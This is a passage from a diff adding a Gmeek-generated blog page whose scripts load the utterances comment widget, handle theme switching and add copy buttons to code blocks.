+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek v2.25 https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","P7IVESC/P7IVESC.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
